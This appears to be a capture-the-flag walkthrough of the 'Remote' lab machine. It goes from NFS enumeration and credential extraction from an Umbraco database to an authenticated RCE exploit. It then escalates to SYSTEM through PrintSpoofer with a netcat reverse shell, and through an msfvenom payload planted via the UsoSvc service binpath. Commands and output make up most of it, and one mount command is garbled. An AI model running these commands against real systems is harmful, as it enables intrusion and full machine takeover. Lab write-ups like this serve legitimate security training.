# Remote

```shellscript
┌──(kali㉿kali)-[~/Downloads]
└─$ sudo nmap -sC -sV 10.10.10.180 -T4 
[sudo] password for kali: 
Starting Nmap 7.95 ( https://nmap.org ) at 2025-11-20 16:30 EST
Nmap scan report for 10.10.10.180
Host is up (0.068s latency).
Not shown: 992 closed tcp ports (reset)
PORT     STATE SERVICE       VERSION
21/tcp   open  ftp           Microsoft ftpd
| ftp-syst: 
|_  SYST: Windows_NT
|_ftp-anon: Anonymous FTP login allowed (FTP code 230)
80/tcp   open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Home - Acme Widgets
111/tcp  open  rpcbind       2-4 (RPC #100000)
| rpcinfo: 
|   program version    port/proto  service
|   100000  2,3,4        111/tcp   rpcbind
|   100000  2,3,4        111/tcp6  rpcbind
|   100000  2,3,4        111/udp   rpcbind
|   100000  2,3,4        111/udp6  rpcbind
|   100003  2,3         2049/udp   nfs
|   100003  2,3         2049/udp6  nfs
|   100003  2,3,4       2049/tcp   nfs
|   100003  2,3,4       2049/tcp6  nfs
|   100005  1,2,3       2049/tcp   mountd
|   100005  1,2,3       2049/tcp6  mountd
|   100005  1,2,3       2049/udp   mountd
|   100005  1,2,3       2049/udp6  mountd
|   100021  1,2,3,4     2049/tcp   nlockmgr
|   100021  1,2,3,4     2049/tcp6  nlockmgr
|   100021  1,2,3,4     2049/udp   nlockmgr
|   100021  1,2,3,4     2049/udp6  nlockmgr
|   100024  1           2049/tcp   status
|   100024  1           2049/tcp6  status
|   100024  1           2049/udp   status
|_  100024  1           2049/udp6  status
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
445/tcp  open  microsoft-ds?
2049/tcp open  nlockmgr      1-4 (RPC #100021)
5985/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: 1h00m01s
| smb2-time: 
|   date: 2025-11-20T22:31:55
|_  start_date: N/A
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled but not required
```

```shellscript
┌──(kali㉿kali)-[~/Downloads]
└─$ showmount -e 10.10.10.180
Export list for 10.10.10.180:
/site_backups (everyone)
                                                                                                                                                                                                                                            
┌──(kali㉿kali)-[~/Downloads]
└─$ mkdir remote  
                                                                                                                                                                                                                                            
┌──(kali㉿kali)-[~/Downloads]
└─$ sudo mount -t nfs sudo mount -t nfs <IP>:/ ./target-NFS/ -o nolock:/ ./remote/ -o nolock
                                                                                                                                                                                                                                            
┌──(kali㉿kali)-[~/Downloads]
└─$ sudo mount -t nfs 10.10.10.180:/ ./remote/ -o nolock
```

We discover it's an Umbraco site

```shellscript
┌──(kali㉿kali)-[~/Downloads/remote/site_backups]
└─$ ls 
App_Browsers  App_Data  App_Plugins  aspnet_client  bin  Config  css  default.aspx  Global.asax  Media  scripts  Umbraco  Umbraco_Client  Views  Web.config
```

After searching online, we see that there is a DB file named Umbraco.sdf in the App\_Data folder

```shellscript
┌──(kali㉿kali)-[~/Downloads/remote/site_backups/App_Data]
└─$ strings Umbraco.sdf
Administratoradmindefaulten-US
Administratoradmindefaulten-USb22924d5-57de-468e-9df4-0961cf6aa30d
Administratoradminb8be16afba8c314ad33d812f22a04991b90e2aaa{"hashAlgorithm":"SHA1"}en-USf8512f97-cab1-4a4b-a49f-0a2054c47a1d
adminadmin@htb.localb8be16afba8c314ad33d812f22a04991b90e2aaa{"hashAlgorithm":"SHA1"}admin@htb.localen-USfeb1a998-d3bf-406a-b30b-e269d7abdf50
adminadmin@htb.localb8be16afba8c314ad33d812f22a04991b90e2aaa{"hashAlgorithm":"SHA1"}admin@htb.localen-US82756c26-4321-4d27-b429-1b5c7c4f882f
smithsmith@htb.localjxDUCcruzN8rSRlqnfmvqw==AIKYyl6Fyy29KA3htB/ERiyJUAdpTtFeTpnIk9CiHts={"hashAlgorithm":"HMACSHA256"}smith@htb.localen-US7e39df83-5e64-4b93-9702-ae257a9b9749-a054-27463ae58b8e
ssmithsmith@htb.localjxDUCcruzN8rSRlqnfmvqw==AIKYyl6Fyy29KA3htB/ERiyJUAdpTtFeTpnIk9CiHts={"hashAlgorithm":"HMACSHA256"}smith@htb.localen-US7e39df83-5e64-4b93-9702-ae257a9b9749
ssmithssmith@htb.local8+xXICbPe7m5NQ22HfcGlg==RF9OLinww9rd2PmaKUpLteR6vesD2MtFaBKe1zL5SXA={"hashAlgorithm":"HMACSHA256"}ssmith@htb.localen-US3628acfb-a62c-4ab0-93f7-5ee9724c8d32
```

We find 2 users and what seems to be their hashes

<figure><img src="https://2006144298-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2FBVYdRQWhXrZbqzYeOYpH%2Fuploads%2FlwXdpKrMc1D11iOT9mrq%2Fimage.png?alt=media&#x26;token=077954e1-6893-4ea8-b5de-9569906160ed" alt=""><figcaption></figcaption></figure>

On the /umbraco endpoint, there is a login page. We can use the credentials `admin@htb.local:baconandcheese` to login

<figure><img src="https://2006144298-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2FBVYdRQWhXrZbqzYeOYpH%2Fuploads%2FBjhfgn7zARomxgtZGLdx%2Fimage.png?alt=media&#x26;token=619a103c-e56c-4d81-a617-59565b13f836" alt=""><figcaption></figcaption></figure>

We are dealing with umbraco 7.12.4, which has a know authenticated RCE exploit

<figure><img src="https://2006144298-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2FBVYdRQWhXrZbqzYeOYpH%2Fuploads%2FsK1eLamwcVh1Ce4cNLJC%2Fimage.png?alt=media&#x26;token=3a5a4e6f-8693-462e-91cb-45d6f0036d22" alt=""><figcaption></figcaption></figure>

```shellscript
┌──(kali㉿kali)-[~/Downloads/Umbraco-RCE]
└─$ python3 exploit.py -u admin@htb.local -p baconandcheese -i 10.10.16.3 -w http://remote.htb
[+] Trying to bind to :: on port 4444: Done
[+] Waiting for connections on :::4444: Got connection from ::ffff:10.10.10.180 on port 49683
[+] Trying to bind to :: on port 4445: Done
[+] Waiting for connections on :::4445: Got connection from ::ffff:10.10.10.180 on port 49684
[*] Logging in at http://remote.htb/umbraco/backoffice/UmbracoApi/Authentication/PostLogin
[*] Exploiting at http://remote.htb/umbraco/developer/Xslt/xsltVisualize.aspx
[*] Switching to interactive mode
PS C:\windows\system32\inetsrv> whoami
iis apppool\defaultapppool
```

```shellscript
PS C:\Users\Public> whoami /priv

PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                               State   
============================= ========================================= ========
SeAssignPrimaryTokenPrivilege Replace a process level token             Disabled
SeIncreaseQuotaPrivilege      Adjust memory quotas for a process        Disabled
SeAuditPrivilege              Generate security audits                  Disabled
SeChangeNotifyPrivilege       Bypass traverse checking                  Enabled 
SeImpersonatePrivilege        Impersonate a client after authentication Enabled
```

```shellscript
PS C:\Users\Public> .\printspoofer.exe -c "C:\Users\Public\nc.exe -e cmd 10.10.16.3 9001"
[+] Found privilege: SeImpersonatePrivilege
[+] Named pipe listening...
[+] CreateProcessAsUser() OK
```

```shellscript
┌──(kali㉿kali)-[/opt/windows/potato]
└─$ nc -lnvp 9001              
listening on [any] 9001 ...
connect to [10.10.16.3] from (UNKNOWN) [10.10.10.180] 49690
Microsoft Windows [Version 10.0.17763.107]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\Windows\system32>whoami
whoami
nt authority\system
```

Other way :

Running winpeas or SharUp, we find a service we can modify

```shellscript
# With winpeas => AllAccess on UsoSvc
???????????? Modifiable Services
? Check if you can modify any service https://book.hacktricks.wiki/en/windows-hardening/windows-local-privilege-escalation/index.html#services
    LOOKS LIKE YOU CAN MODIFY OR START/STOP SOME SERVICE/s:
    RmSvc: GenericExecute (Start/Stop)
    UsoSvc: AllAccess, Start
    
# With SharpUp
PS C:\Users\Public> .\sharp.exe audit

=== SharpUp: Running Privilege Escalation Checks ===
[!] Modifialbe scheduled tasks were not evaluated due to permissions.
[+] Hijackable DLL: C:\inetpub\wwwroot\bin\AMD64\sqlceme40.dll
[+] Associated Process is w3wp with PID 4600 

=== Abusable Token Privileges ===
        SeImpersonatePrivilege: SE_PRIVILEGE_ENABLED_BY_DEFAULT, SE_PRIVILEGE_ENABLED


=== Unattended Install Files ===
        C:\Windows\Panther\Unattend.xml


=== Modifiable Services ===
        [X] Exception: Exception has been thrown by the target of an invocation.
        [X] Exception: Exception has been thrown by the target of an invocation.
        [X] Exception: Exception has been thrown by the target of an invocation.
        Service 'UsoSvc' (State: Running, StartMode: Auto)
```

Verify that the service is running as SYSTEM

```shellscript
PS C:\Users\Public> sc.exe qc UsoSvc
[SC] QueryServiceConfig SUCCESS

SERVICE_NAME: UsoSvc
        TYPE               : 20  WIN32_SHARE_PROCESS 
        START_TYPE         : 2   AUTO_START  (DELAYED)
        ERROR_CONTROL      : 1   NORMAL
        BINARY_PATH_NAME   : C:\Windows\system32\svchost.exe -k netsvcs -p
        LOAD_ORDER_GROUP   : 
        TAG                : 0
        DISPLAY_NAME       : Update Orchestrator Service
        DEPENDENCIES       : rpcss
        SERVICE_START_NAME : LocalSystem
```

Create a reverse shell payload, upload it to the target machine, change the binpath of the service to the shell and restart the service

```shellscript
┌──(kali㉿kali)-[/opt/windows]
└─$ msfvenom -p windows/shell_reverse_tcp LHOST=10.10.16.3 LPORT=4444 -f exe > test.exe   
[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x86 from the payload
No encoder specified, outputting raw payload
Payload size: 324 bytes
Final size of exe file: 7168 bytes

PS C:\Users\Public> sc.exe config UsoSvc binpath="cmd /c C:\Users\Public\test.exe"
[SC] ChangeServiceConfig SUCCESS
PS C:\Users\Public> sc.exe stpo UsoSvc
PS C:\Users\Public> sc.exe start UsoSvc
```
